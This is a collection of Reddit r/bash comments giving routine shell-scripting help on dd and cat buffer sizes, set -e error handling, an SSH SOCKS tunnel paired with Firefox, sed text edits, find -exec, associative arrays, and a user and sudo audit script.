The two commands do the same thing but with a different block size. There could be some reasons for that: * The process is supposed to read packets/records worth of data and chooses a matching buffer size, either to allow better interleaving or to avoid leaving half-read entries * The process is supposed to transfer 100-1000 of MB/s, and the author found that the system `cat` used a too small buffer causing excessive CPU usage * The data is being read from or written to a buggy program that can't be modified, and this is a way to avoid triggering the buggy behavior * The author had some kind of bug, randomly tried copying stuff from the internet, and just stopped touching it once it worked, leaving all the cargo cult attempts in place
&gt; the memory page size on Linux doesn't change. Linux supports multiple page sizes, currently from 4k to 64k
You can go nuts with math and use `xdotool` combined with `xwininfo`, `tput lines`, `tput rows` to come up with something. https://stackoverflow.com/questions/8480073/how-would-i-get-the-current-mouse-coordinates-in-bash/37238106 https://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window https://stackoverflow.com/questions/18514989/linux-get-window-border-height https://stackoverflow.com/questions/25367016/how-to-get-display-width-of-a-string-from-linux-command-line 
ddd is not a debugger, it's just a gui wrapper for common command line debuggers. You could use one of those directly. I have had decent experience using a GUI over ssh via `ssh -X` or `ssh -Y`. In my ~/.bashrc, I have: alias sshx='ssh -XC' complete -F _known_hosts sshx #Auto-complete based on entires in /etc/hosts So I can: sshx someUser@someHost xclock 
Thanks everyone, I seriously learned a lot of extra interesting info that I'll research today too.
i love dd
For me X is not always an option. So I rather have something without it. Either a bad or slow connection, or no Linux machine at hand, or working from my phone, or ... Another reason is that I like to have as little layers or points of failure as possible. It could be the GUI that is the issue. Being used to do it in CLI means you will panic less when the shoe hits the fan. That will be the moment you are stressed. And I have also some machines that do not even HAVE a GUI. Does not mean it isn't a valid tool for others. I rather go old school. OK, I do use gvim, but that is not that different from vim and I am able to use plain vi with some cursing. I am well aware of aliasses. I use .alias and point to that, so I do not clutter my bashrc. For the main servers I just use e.g. sshx and it will connect to a server as a specific user with specific parameters. I have the following in bashrc: if [ -f ~/.alias ]; then . ~/.alias No real need for the if, as it has been present since plenty of years, but no need to take it away either. Plenty of aliasses have turned into small scripts over time. (Feature creep)[https://en.wikipedia.org/wiki/Feature_creep] is a serious disease
**Feature creep** Feature creep, creeping featurism or featuritis is the excessive ongoing expansion or addition of new features in a product, especially in computer software and consumer and business electronics. These extra features go beyond the basic function of the product and can result in software bloat and over-complication, rather than simple design. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/bash/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
&gt; And I have also some machines that do not even HAVE a GUI. I have a check for that in some of my scripts. You have a few options for checking that and dropping to no-gui on fail `${DISPLAY}`, `xset q`, `xdpyinfo` On the computers I use, I can rely on `${DISPLAY}`, along with `gedit` and `nano`, so I have: 
gvim already does this by itself. As gvim and vim are almost identical in usage, I do not need to know two different programs. It will open a new tab if there is already a file gvi () { if [ "$#" == "0" ] then /usr/bin/gvim --servername $(whoami) 2&gt; /dev/null else /usr/bin/gvim --servername $(whoami) --remote-tab-silent $@ 2&gt; /dev/null fi } On servers I own and have no GUI, gvi is just an alias to vim. That way I again only need to do one thing. I have been writing scripts where I first looked if there was a GUI. If there was, use Zenity or Yad. If not available, go to a CLI. In CLI look for Dialog or Whiptail and if all that fails, just the basic echo and printf screens. Look if color is available and use that and if not, not color. Even a simple `echo "hello World!"` becomes a small nightmare that way. I now have learned that whiptail and dialog is good enough for me with a MUST to be able to run the script that uses it. Either one is good if you write it for whiptail.
 I read https://git.savannah.gnu.org/cgit/coreutils.git/plain/src/cat.c and there are two cases to consider, a call to `cat` or `simple_cat`. For both of them: ... size_t page_size = getpagesize (); ... inbuf = xmalloc (insize + page_size - 1); ... For then for `cat` outbuf = xmalloc (outsize - 1 + insize * 4 + LINE_COUNTER_BUF_LEN + page_size - 1); ok &amp;= cat (ptr_align (inbuf, page_size), insize, ptr_align (outbuf, page_size), outsize, show_nonprinting, show_tabs, number, number_nonblank, show_ends, squeeze_blank); ... Or for `simple_cat`: ok &amp;= simple_cat (ptr_align (inbuf, page_size), insize); 
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
yeup, just got that now!
 if gcc ... then &lt;execute&gt; fi
Use "$?" which is variable that holds return value of last command. from top of my head if [[ "$?" -ne 0 ]] do echo "Complilation error" return 1 done If gcc return anything else then 0 (no error), the script will stop.
For the simple_cat one, it's here: insize = io_blksize (stat_buf); Like /u/LukeShu correctly points out, 128KiB is the minimum size and it will instead use the device's reported optimal size if it's larger. This is not the case on any of my systems, and I'd love to know when that's the case.
Change `gcc $1` to `gcc $1 || exit 1` Also change `gcc $1 -o $2` to `gcc $1 -o $2 || exit 2` You can make it even fancier and do something like #!/bin/bash # script that will gcc compile and output # if no arg then ./a.out ERROR () { echo "Error on line number $1" exit 1 } if [ $# == '1' ] then gcc $1 || ERROR $LINENO ./a.out|| ERROR $LINENO # if arg then ./arg elif [ $# == '2' ] then gcc $1 -o $2 || ERROR $LINENO ./$2 || ERROR $LINENO else echo 'usage: compile (argument1) (argument2)' fi The `||` means to do something if there is an error. Here is says to run ERROR $LINENO. The $LINENO is the linenumber. So it would actually do `ERROR 13`. That 13 is the first parameters now for that command, so you will see as output `Error on line number 13`. Now it will even stop if ./a.out does not work. The thing is that if there are no parameters, it will still try to do the second option and there is no $2. And if there are 3 parameters, what should it do then? But that is a whole other `case`.
 firefox -P --no-remote &amp;&amp; echo done &amp;#x200B;
Okay cool so that will at least be good enough to start firefox but I still want it so once that firefox session closes it also closes the proxy that was started before it
actually i t also works just being on the next line too. The script will wait until the firefox command exits
Also to login ssh via a script you can use keys? [https://www.howtoforge.com/linux-basics-how-to-install-ssh-keys-on-the-shell](https://www.howtoforge.com/linux-basics-how-to-install-ssh-keys-on-the-shell)
Yeah I know that but the whole thing is I want a single script that will start the ssh tunnel connection, launch firefox so I can choose the profile with the proxy settings and then when Im done using firefox and close it the script sees that firefox has been closed and then disconnects ssh. So basically everything the script starts up I want it so when firefox closes it shuts everything back down 
Look [here](https://www.thegeekstuff.com/2008/11/3-steps-to-perform-ssh-login-without-password-using-ssh-keygen-ssh-copy-id) for the steps to do a login without password. Also not wise to show public IP address online. Use an IP address in the range 203.0.113.0 - 203.0.113.255 From `whois 203.0.113.0` remarks: This block is reserved for use in documentation and remarks: should not be used in any real networks. remarks: Please see more details at remarks: http://www.iana.org/go/rfc5737
&gt; Idk maybe there is also a way to include the password in that command as well(?) As @houghi mentioned in [their answer](https://www.reddit.com/r/bash/comments/a2vb3c/script_to_start_proxy_and_then_run_firefox/eb1g56c/), use SSH public-key authentication to achieve this. &gt; I'm trying to figure out how the script will know when the browser is closed so at that point it will then stoop the ssh connection. You're launching Firefox in the foreground, so your script will block till you close Firefox anyway. What you want do is actually quite straightforward with the right SSH options: ``` #!/bin/bash # STEP 1: Start an SSH master connection (-M) # in the background (-f) # without running a remote command (-N) ssh -M -o ControlPath=/tmp/socks.%n.%p.%r -f -N -D 8123 -C evily2k@102.2.115.73 # STEP 2: Launch Firefox in the foreground firefox -P -no-remote # STEP 3: When user is done with Firefox, send an "exit" command to the master connection ssh -o ControlPath=/tmp/socks.%n.%p.%r -O exit evily2k@102.2.115.73 ``` `man ssh` and `man ssh_config` for further details.
&gt;set -x I tried that in the middle this morning... made my day!
``` sed -i.bak 's/^\.//' sample.txt ``` edits `sample.txt` in-place, backing up the original file as `sample.txt.bak` (`-i.bak`), just in case. The `sed` script `s/^\.//` can be broken down as follows: * `s`: substitute (over every line, by default) * `/`: look for... * `^`: start-of-line, followed by... * '\.': a _literal_ period (`.` by itself actually means "any character") * `//`: and substitute what we just found with nothing **Further Reading:* * `man sed` * [Sed - An Introduction and Tutorial by Bruce Barnett](http://www.grymoire.com/Unix/Sed.html)
I wish more people could reply like you just did. You aren't just providing a solution, you provide an explanation and point us to further learning if we are so inclined. Even though I'm not op, I just wanted to say I appreciate it.
It's not my actual ip lol I changed it. I'm not that silly
Ahhh okay. Thanks for pointing me in the right direction! I'll see if I can get something working using that info!
Very useful.
that sed tutorial's awesome
You can use [Bash parameter expansion](http://mywiki.wooledge.org/BashGuide/Parameters#Parameter_Expansion): while read -r line;do echo ${line#.};done &lt;sample.txt &gt;new_sample.txt
 diff ... || : is succinct and idiomatic.
I use a shell wrapper (bash) script for chromium-browser, firefox &amp; opera: inpath chromium-browser firefox opera Directory '/home/common/bin/': 'chromium-browser' 'firefox' -&gt; 'chromium-browser' 'opera' -&gt; 'chromium-browser' Directory '/usr/bin/': 'chromium-browser' 'firefox' -&gt; '/usr/lib/firefox/firefox.sh' 'opera' -&gt; '/usr/lib/x86_64-linux-gnu/opera/opera' The script includes a 'Service available?' option: firefox --help This is a shell wrapper for 'firefox'. Usage: Open in New Window(s): 'firefox [Filename|URL] [Filename|URL] ...'. Usage: Open in New Tab(s): 'firefox -tab [Filename|URL] [Filename|URL] ...'. Usage: Service available?: 'firefox -sa'. If service is available (main binary running): Outputs binary's PID and exits with 0. If service is NOT available (main binary Not running): Doesn't output anything and exits with 69. Original program help: ........ I use the above option to keep other scripts running while the browser 'main binary' is running: ................ if Pid=$($Command $ServiceAvailableOptionStr) # Pid of runnig binary. then # Keep this shell instance running until $Command binary exits. while ps --pid=$Pid &amp;&gt;/dev/null do sleep $IntervalWaitingForApplicationServices done fi ................ Note: '$Command $ServiceAvailableOptionStr' above can be 'firefox -sa' (there are several scripts in my system that support 'Service available?' option). I also use a bash script that starts applications after a GUI login. Here is a typical log: 2018/Dec/04 09:23:17: GraphicalSessionAutostart: Starting new graphical session for user: 'manolo'. 2018/Dec/04 09:23:17: GraphicalSessionAutostart: $COMMON_MESSAGES_SYSTEM_DIR: 2018/Dec/04 09:23:17: 2018/12/04 09:22:30 InternetConnectionOn 2018/Dec/04 09:23:17: 2018/12/04 09:22:30 LocalNetworkOn 2018/Dec/04 09:23:17: 2018/12/04 09:22:26 UsbControlledPowerStripAvailable 2018/Dec/04 09:23:17: GraphicalSessionAutostart: Waiting for graphical session to stabilize. 2018/Dec/04 09:23:19: GraphicalSessionAutostart: Waiting... 2018/Dec/04 09:23:19: GraphicalSessionAutostart: Command 'GuiDesktopTextScalingFactor' ran successfully. 2018/Dec/04 09:23:19: GraphicalSessionAutostart: Command 'pulseaudio --kill' ran successfully. 2018/Dec/04 09:23:20: GraphicalSessionAutostart: 'MainMenuAndNetTraffic --verbose --icon $COMMON_MISC_DIR/Icons/MainMenu.png --directory $HOME/.MainMenu' running. 2018/Dec/04 09:23:21: GraphicalSessionAutostart: 'GuiStartSessionApplications --delay' running. 2018/Dec/04 09:23:21: GraphicalSessionAutostart: All auto-start commands and applications ran/started successfully. 2018/Dec/04 09:23:26: GuiStartSessionApplications: 'GuiInternetMail --pa' running. 2018/Dec/04 09:23:27: GuiStartSessionApplications: 'GuiStartAllDownloadingClients' running. 2018/Dec/04 09:23:28: GuiStartSessionApplications: 'DefaultBrowser' running. 2018/Dec/04 09:23:29: GuiStartSessionApplications: 'PlayAudioFilesList_Music' running. 2018/Dec/04 09:23:29: GuiStartSessionApplications: All start-session applications started. 
Thanks! I'll dig into it this weekend (as I'm away at the moment) to understand it fully. 
Thats exactly what I was looking for, thank you very much. I understand that the \`||\` is the condition that will bypass \`set -e\`, I assume \`:\` is some sort of \`NOP\` command ? 
&gt; I assume `:` is some sort of `NOP` command ? `:` is a builtin, so you can find out what it does using `help :`. 
You have a couple of options: * If you only want to disable "fast-fail" on the `diff`, then make it an *OR list* with the special `:` command that just returns success: &amp;#8203; diff ... || : * If you want to disable "fast-fail" on a *block* of commands (say, the three you list above), then just turn it off temporarily with `set +e`, and re-enable it at a later point: &amp;#8203; set -e [...] set +e # Don't fail on me... diff --report-identical-files --side-by-side --minimal --color=auto "${file}" &lt;(ssh someHost "cat ${dir}/${file}") echo "Deploy \`${file}\` to \`/${dir}\`? [y/N]" read -s -n 1 a set -e # ...until this point. [...] &gt;I have read that set -e won't terminate if inside a list That's not what the [bash man page](https://linux.die.net/man/1/bash) says: &gt;**-e** &gt; &gt;Exit immediately if a *pipeline* (which may consist of a single *simple command*), a *subshell* command enclosed in parentheses, or one of the commands executed as part of a command list enclosed by braces (see **SHELL GRAMMAR** above) exits with a non-zero status. The shell does not exit if the command that fails is part of the command list immediately following a **while** or **until** keyword, part of the test following the **if** or **elif** reserved words, part of any command executed in a **&amp;&amp;** or **||** list except the command following the final **&amp;&amp;** or **||**, any command in a pipeline but the last, or if the command's return value is being inverted with **!**. \[...\] That's why the following script: #!/bin/bash set -e ( false ; echo Hi from subshell ) { false ; echo Hi from group command ; } echo Here now prints nothing at all.
Yes, but using somebody elses IP is even worse. * 1 It might draw attention to somebody who does not deserve it/ * 2 It might cause a wrong diagnosis in people who try to help you That is why I gave you an alternative to use. That way people can know that it is used as an example. The same with e.g. example.com and me.example.net and server.example.org. Better than using, at random, hackme.houghi.org That would make people take down that server. That would be bad. 
The proxy is through my fathers house where my server is located... I run a few services so that's why I was to be able to quickly enable and disable a proxy for a separate browser instance so I can manage some of my services at my dads house.
Ok, so a good alternative was to create a script that I named [clone.sh](https://clone.sh), so I basically use an alias that calls the script and it works perfectly ! script -&gt; git clone [git@git](mailto:git@git).(myschool):/(mymail)/$1 alias -&gt; alias clone="./clone.sh" And in the terminal : clone (repo name) 
I would use procmail for that. Much easier to configure and saves you lots of time. It can do what you want and much, much more. With bash it is possible, but you would need to look at the change in the mailbox, separate the mail header and the mail body, look at the time each message came in, not process old messages, look at the new messages if they are what you are looking for. After that you need to check the rest of the email. Is it possible? Sure, if you don't have a life. It could be very interesting to do. I have done something similar to that, exept I looked if messages where read or not. OTOH, procmail already has you coverd by it. It can do all that you want, the moment the email comes in, then do with it whatever you desire, like moveing it to a separate mailbox and do anything else with it. e.g. run a script that sounds the alarm in a building. Or forward it to adifferent mailbox, or anything else you want to do. No need to reinvent the wheel. If you only need the functionality, use procmail. If you want the experience, start and let us know where your issues are.
Pure bash solution: #!/bin/bash readarray -t samples &lt; sample.txt for sample in "${samples[@]}"; do echo "${sample#\.}" done &gt; newFile.txt &lt; Direct input file to array @ all items in array # eliminates everything before first occurance of pattern . is our pattern (Single dot at begining) \ escapes the glob interpretation of . &gt; Direct loop output to file 
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
This would be exactly my statement as well. Use a tool, or if you're trying just because, just start working it. Maybe start with a grep statement for unread emails and parse from there.
First of all, is this homework? There are several things wrong with your script. The main reason it's not working is the quoting in your `ln` command line. Think about what happens when when you put double quotes around a variable. Your script as written will probably create a broken symlink that's super long. Once you fix that problem, you will run into problems if you have any filenames with spaces in them. That will require that you do your script a totally different way. Even if you don't have spaces in any filenames, you might eventually run into a problem if you end up finding too many files because the command line has a limited number of characters allowed. Finally, there are several ways to do this in a much simpler way. For instance you can do a `-exec` in your find command and create the symbolic links within the find command. If done correctly this would fix all of the previously mentioned problems. Slightly more optimal, you can use `find` and pipe that to `xargs` both with the `-0` option which would allow a slightly more optimal because it executes `ln` with multiple files at a time. In this last option, you will have to call `ln` with the `-t &lt;directory&gt;` option. 
If you use find's built in -exec, you can do both functions at once: find /search/dir -type d -mtime -1 -exec echo ln -s {} /path/to/linked/dir \; The `-exec` option will substitute `{}` with the filename/dirnames found. The `\;` at the ends tells find to execute the command for each found object (a `+` at the end will pass all the found objects at once). Remove the `echo` command if the output does what you expect it too.
Parsing an email for a common string such as "KO" or "OK" is going to produce a lot of false positives. Are you trying to monitor the trigger of another monitoring system?
not home work, I am starting to lean bash scripting, for my server. 
Change file names quickly: mv /path/to/my/longfilename{,_old} mv /path/to/my/longfile{name,label} Create a quick file backup: cp /path/to/my/datacurrent{,.bak} cp /path/to/my/data{current,old} Not exactly bash commands: Tab completion and Tab completion's hotter cousin PageUp. PageUp allows you to walk through the your command history even matching partial commands (e.g $ vi /etc +[PageUp]). Add a white space in front of a command and it won't be saved to your history. 
Okay, just like that, I solved it. I suppose the "x" isn't an operator, I replaced it with \* and it works.
I think you need to replace the x with \*. echo "scale=3; $a \* $b" | bc instead of echo "scale=3; $a x $b" | bc. If you look in the man page for bc is shows \* and not x. 
Start your scripts with #!/bin/bash SPACES=$(printf "%`tput cols`s") PS4='${SPACES:0:$((5-${#LINENO}))}$LINENO ${FUNCNAME:-${SPACES:0:12}}${FUNCNAME:+${SPACES:0:$((12 - ${#FUNCNAME}))}}' set -ex That way you will see the output and get to error detection faster. Once the testing is over, you can remove the x in `set -ex`. Or leave out the lines with SPACES and PS4 if it confuses you. The `set -ex` does the following: The e will stop the script when there is an error. Making it easier to understand what went wrong and not go on forever. The x makes it easier to see what it is trying to do. And the SPACE and PS4 will show you line and function that are being done. Easy for larger scripts
Wow, I don't work on anything of that scale. I get batches of hundreds of 3-D MRI image files at a time, and have to put them all through a dozen or so separate steps of varying complexity. In previous projects I would get small batches more frequently, and it made sense to run the MRIs through one at a time. Since reading this exchange, I've started to switch to thinking of sets of processes to run in parallel. Such as separate, independently operating child scripts to set up all the new file structures, or to reformat the images, or to extract the subject and machine details to file, etc. It means ditching the global variables I've been using, and having to be more explicit with my quality control measures, but it will sure make better use of my server. Thank you for sharing what you know!
You’re assigning 30DAY to the output of a function which at that point hasn’t been defined, so there’s no output. Later you call the function again and it will run, but the output isn’t being saved. Assign your variable to the function in place of just calling the function. That said, the other answer in this thread about using -exec is a better answer.
Thanks, very useful
Thanks
If you're using `bc`, I would recommend starting with the `-l` flag. Some information [here](https://www.gnu.org/software/bc/manual/html_node/bc_18.html) &amp; [here](https://www.johndcook.com/blog/2010/07/14/bc-math-library/).
no false positives, these are automatic emails, they contain either ko or ok, no other email involved.
So I finally got time to go through it. I am on the part where Apache2 status is being checked. But I get the following error: &amp;#x200B; line 5: _restartservice: command not found line 9: syntax error near unexpected token `}' line 9: `}' &amp;#x200B; &amp;#x200B;
No problem. I noticed I posted this after you already said you fixed it. 
Pass it through shellcheck.net, I can see a bunch of problems there that will be picked up. You should also read Google's Shell Style Guide, which is linked in the sidebar, specifically the part about file extensions (i.e. don't use '.sh')
Hi, From the error you have supplied it looks like you have not used the whole script only a portion of it. Make sure to copy from top to bottom of the code into your file. P
Thanks for your suggestions! This is my second shell script, so I'm still learning. I'm on mobile ATM but when I have access to a computer I'll look at shellcheck and the style guide, and implement the style changes. I wasn't sure if BASH accepted same-line brackets (I could have checked); all the example scripts I saw did it the way I did.
Update: this is what is happening to me: https://imgur.com/a/sEUeVXN Sometimes the \n shows up, sometimes it doesn't.
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/qtIHAgu.jpg** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) ^^| ^^[deletthis](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=delet%20this&amp;message=delet%20this%20eb6beyz) 
Update: done. 
Directly comparing strings like that, won't work. I can think of some different approach. But in any way, you would have to go and compare all of them. Just assign your compare results to a kind of final flag, based on which you would make the decision to execute the action or not.
not to sure I follow, do you mean define red=1 blue=2 green=3 black=4 and then compare? 
You could start reading Google. This is all over the web. It's actually pretty easy though. Create a file with a ".bash" file extension. At the top of the file include the shebang header ("#!/bin/bash"). Then make the file executable by doing: sudo chmod +x &lt;file_name&gt;.bash Example: #!/bin/bash sudo apt update cd ~/Desktop mkdir Cool_Stuff
Associative arrays are your friend here. You can set up a lookup table of colors against appropriate weights, like this: declare -A LOOKUP=([red]=1 [green]=5 [blue]=2 [yellow]=34) new=green old=red if [ ${LOOKUP[$new]} -gt ${LOOKUP[$old]} ]; then echo Making things new again fi Read the **Arrays** section of `man bash` or [this online man page](https://linux.die.net/man/1/bash) for further details.
I recommend [The Linux Command Line](http://linuxcommand.org/tlcl.php) as a general command line and Linux introduction, then the [BashGuide](https://mywiki.wooledge.org/BashGuide) for an excellent overview of Bash best practices.
thanks, Ill read more up on that, looks to fit the bill
I am currently reading the [BashGuide](http://mywiki.wooledge.org/BashGuide) and it is very comprehensive, 10/10 would recommend. My next goal after finishing it is the [BashHackersWiki](http://wiki.bash-hackers.org/)
If you put your script in /usr/bin, you can type the file name from anywhere in terminal to execute it 
https://www.ostechnix.com/find-sudo-users-linux-system/ The password thing is something completely different and has absolutely nothing to do with sudo. No idea about that.
How can you connect to `ssh -t server`. ssh will just asume you are a specific user. Thta user can be root as well. Or perhaps I am not clear about what the problem is.
passwd -Sa will give you the password information you are looking for, getent group sudo (or wheel depending on your distro) will show you users in the sudo group 
You will need a function, or better, a script to do that. I would also not let it replace `ls`, but instead call it `ll` or `lls` or 'lss` or something like that. That way you will know what to expect and not second guess if the order is correct, because there is no hidden file, or because it shows it already like that.
`ls` has a few sort options, if one of those suites you better you could use an alias with it. If you really want to do checks and change behavior based on the presence or contents of a file you'd definitely want a function rather than an alias though. The other option would just be to step back and think if there's a different organizational structure for the files that makes sense. Perhaps having fewer files in the directory would make it easier, and using meaningful subdirectories could help provide more clarity or something like that.
If you include the shebang you don't need the .bash extension. For any file that you'll be executing from the shell (eg this one), it's better not to include the extension as we don't really care what language it's written in when we execute it. Also, chmod does not require sudo. Other than that it looks great!
Hi; Master server is an Bastion, so when we use ssh command, we don't need to specify the user to connect.
So what is the problem?
A function would be way easier to set up and customize. Anyway you can always set a lazy alias to list the files you want first and then the rest, like `ls c* ; ls !(c*)` and add ifs, variables and all, but again a function is way easier and can do more things.
&gt; The problem is happening in a **company**, so I don't have the possibility to install new tools (like **fabric** because I know I'm going to be told about it). If the company won't let you install the toolsneeded to do the job they're telling you to do, that's a problem. Specifically, *their* problem. That's the sort of thing you tell your manager: "the way we'd do this is via X, but person Y says I can't install X, how do we resolve this?".
For the password question, you may want to look at `chage -l`
Let's clear up one **MAJOR** misconception first: **You don't have to be in group** `sudo` **to run** `sudo`**.** `/etc/sudoers` can specify capabilities for other users/groups, and "group `sudo` can sudo" is just a convention that has been broken by particularly cunning sysadmins like me, just to test script kiddies and potential hires. (In fact, the sample sudoers file in the source distribution lists a whole bunch of users and a single group called `wheel`: [examples/sudoers](https://www.sudo.ws/repos/sudo/file/default/examples/sudoers)) Therefore, the only correct way to determine if a user is permitted to `sudo`...is to *ask* sudo politely with `sudo -l -U &lt;login&gt;`. So your final script would probably look something like this: #!/bin/bash passwd -Sa | while read LOGIN PASS_TYPE LAST_CHANGE MIN_AGE MAX_AGE WARN_DAYS INACTIVE_DAYS; do # Is this account disabled? [[ $PASS_TYPE == L ]] &amp;&amp; DIS="disabled" || DIS="" # Can this account sudo? sudo -l -U "$LOGIN" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo" # Grab misc. info from passwd entry IFS=: read _ PASS USERID GROUPID FULLNAME HOMEDIR SH &lt; &lt;(getent passwd "$LOGIN") echo "${LOGIN}|${FULLNAME}|${USERID}|${LAST_CHANGE}|${MIN_AGE}|${MAX_AGE}|${WARN_DAYS}|${INACTIVE_DAYS}|${DIS}|${CAN_SUDO}" done **Further Reading:** * `man passwd`, read the description of the `-S` option for its output format * `man 5 passwd` for the description of the fields returned by `getent passwd`
Just make sure to `shopt -s extglob` if you're going to use this syntax of course
I'm not sure I see your problem, why do you want to see these particular files at the top of the list? One function I use all the time is similar to `alias lstr="ls -ltr |tail"`. I use it for directories that have many files but I only want to see the ones that have been touched most recently. 
What about it? Why not just use wget?
This will open a browser and load the url there. wget will not do that. 
Then why not just run a browser directly?
I think you should give the readme another read. Or I need to update this post’s description.
You can just invoke a browser directly. Seems to be a solution in search of a problem. Or reinventing the wheel. 
I mean... you don’t find it just slightly annoying to have to take your hands off your keyboard just to click on a link printed on to your terminal? It’s totally fine if you don’t, in which case this isn’t useful to you. I find it annoying though. 
Wow! thanks man. My last question is : I want to parse of the output of lastlog. I want to add last of output such as LATEST variable. &amp;#x200B; echo "${LOGIN}|${FULLNAME}|${USERID}|${LAST_CHANGE}|${MIN_AGE}|${MAX_AGE}|${WARN_DAYS}|${INACTIVE_DAYS}|${DIS}|${CAN_SUDO}"|${LATEST} I have written something like below. How can integrate this your script ? &amp;#x200B; last | awk ' { for( i=1;i&lt;=NF;i++ ) { if ( $i ~ /Mon|Tue|Wed|Thu|Fri|Sat|Sun/ ) { j = 0 str = "" for ( j=i; j&lt;=NF;j++ ) { str = ( str ? (str FS $j):$j ) } print str break } } }' &amp;#x200B;
You can run a browser from the command line. You can even pass an already-running browser a url to open, in a new tab if desired.
I like it :)
Why yes you can. But let’s say a program echo’es out a gnarly url with parameters and everything. You’d have to copy/paste or type the whole thing out. The point of this is that it will find the url for you and just call open for you.
I have all my school notes organized in such a way that it's extremely convenient to navigate through bash. The soft and hard link functions are extremely useful in this context. The problem is when you have too many files it can be hard to figure out where exactly things are, so I organized everything by subject, sub-subject, sub-sub-subject, etc. This makes things easier, but now it's harder to tab complete, so I have to ls occasionally to know where I'm going. When ls'ing it's much easier to find things if they're organized by topic, rather than alphabetical. I *know* kinetics comes before electromagnetism topically. That's how it's organized in my mind. It'd be helpful if the computer followed that. Granted there are cases where subtopics are learned after the main topic, but I didn't claim to organize it chronologically anyway. It's more for when topically different things depend on one or another the simpler general topic needs to be listed first. Anyway, it doesn't really matter if you agree with the way I organize it. I'm more doing this for my sake than anyone else's I was just seeing if anyone else had ideas on how to do it best. 
I see. Well bash's go to sorting tool, `sort`, does not allow customized key sorting unfortunately. It wouldn't be too hard to implement however, depending on your proficiency level. I would start with making a less than function that returns whether string1 &lt; string2 according to the metric you desire. Once you have that it should be doable to implement a sorting algorithm in bash from looking at pseudo code. I would say [quicksort](https://en.wikipedia.org/wiki/Quicksort) would be a decent choice. Then you could have your custom function pipe the output of `ls` to your sorting function and `echo` it to stdout. 
I edited the main post with my fix. I have files named `.order` in my organized directories now. 
I meant to say something along this: new="green" old="red" execute="no" case "${new}" in red) [[ "${old}" == "red" ]] &amp;&amp; execute="yes" ;; green) [[ "${old}" == "black" ]] &amp;&amp; execute="yes" ;; esac And so on. Basically do all your variations, and decide what value should be for `execute` flag. And then to execute your task you'll just have one condition if [[ "${execute}" == "yes" ]] then echo "Execute your task" fi
The standard output of any pipeline can be assigned to a variable quite simply: \`\`\` MYVAR="$(cmd1 | cmd2 | cmd3)" \`\`\` That said, I'm assuming by your description that you just want the login time of the \_latest\_ entry in the lastlog output. If that's the case, then just use the \`cut\` command to get the necessary characters: \`\`\` LATEST="$(last ${LOGIN} | head -1 | cut -c40-)" \`\`\` &amp;#x200B;
[Context](https://www.reddit.com/r/bash/comments/84xuy8/get_all_users_account_status/). And look at OP's post history.
Why not \`xdg-open\`? Not dismissing your work, but genuily interested how is this better or different. 
I mean, `ls` already color codes files and directories. What are the benefits of `lsd`?
To add to this, this challenge obviously gets a lot trickier when you're dealing with a host or hosts that authenticate against some kind of directory. While it's possible to pull all the users from the directory and then loop through `sudo -l -U`, that's going to grind for a while depending on the org size. Reliably pulling user and group names from `sudoers` and `sudoers.d/` is going to be tough unless you're strictly following some parseable standard like "everything MUST be an alias", at which point you could do something like `awk -F '=' '/User_Alias/{print $2}'` and work your way through each element that's output. As a middle ground, you could do something like this to get a rough list of local users and directory based users who have previously logged in. This obviously assumes GNU `stat` and `/home` being the basedir. cat &lt;(getent passwd | awk -F ':' '{print $1}') &lt;(stat -c %U /home/*) | sort | uniq The better approach IMHO is to learn `sudo` syntax and get your sudoers files under control and into a config management system. When I'm running `sudo` audits, it's at the user level i.e. "across this fleet of hosts, on which servers does userA have `sudo` privileges and what privileges do they have?"
This looks cool! at some point it would probably make sense to create a "better coreutils bundle" including all those rewritten packages...
Will xdg-open search for links?
lolutils: lolcat, loltail, lolhead, loljoin, lolpaste, lolmv, lolmkdir, etc. 
Rainbow colours.
`man xdg-open` &amp;#x200B;
\- Icons \- customs colors based on size / last modification date / permissions /etc \- the --tree option. \- a bunch of other stuff coming soon
Users details are stored in `/etc/passwd` The following will loop over lines in `/etc/passwd`, It's print out the UID in brackets, followed by the username while read -r line; do user=$(cut -d ':' -f1 &lt;&lt;&lt; "$line") uid=$(cut -d ':' -f3 &lt;&lt;&lt; "$line") echo "(${uid}) ${user}" done &lt; /etc/passwd You can add to this logic for filtering out UIDs &gt;= 1000 The command `groups &lt;user&gt;` will output the groups a user belongs to. You can include this in your output
I would consider using awk. Something ala awk -F':' '{print $1, $3 }' /etc/passwd
Thank you soo much I was along the line of this which give me hope, you are a life saver!!
Right, so you’d have to do `xdg-open https://...`
I was reading into it but my outputs would come out weird I will try this, thank you for your help!!
How would you like your output?
This reads a little like "I didn't do my homework that's due in an hour"...
I looked back at the awk I tried and it is completely different 😂 so let me try yours and see if it fits better
You got me. Except Im taking a test right now. 
That's even worse! Well, from a moral point of view. Interesting that you can take a test and still be able to look these things up though. Man times have changed since I was in school...
Sounds easy enough, good luck finding the solution on your test!
Take the L.
